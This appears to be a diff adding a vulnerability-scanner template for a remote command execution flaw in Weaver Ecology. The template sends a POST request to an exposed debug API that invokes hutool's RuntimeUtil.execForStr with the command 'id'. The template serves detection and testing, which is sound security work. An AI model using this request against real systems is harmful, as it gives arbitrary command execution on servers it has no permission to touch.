@@ -1,0 +1,28 @@
+id: ecology-execforstr-rce
+brief:
+    title: Weaver Ecology ExecForStr Remote Command Execution
+    by: DhiyaneshDk
+    level: critical
+    about: Weaver Ecology exposes a debug API endpoint that allows invocation of `cn.hutool.core.util.RuntimeUtil.execForStr`, resulting in remote command execution. Successful exploitation allows an attacker...
+    label:
+        - weaver
+        - ecology
+        - rce
+        - dubbo
+        - hutool
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr'
+      head:
+        Content-Type: application/json
+      body: '[["id"]]'
+      signs:
+        - "on": word
+          has:
+            - application/json
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
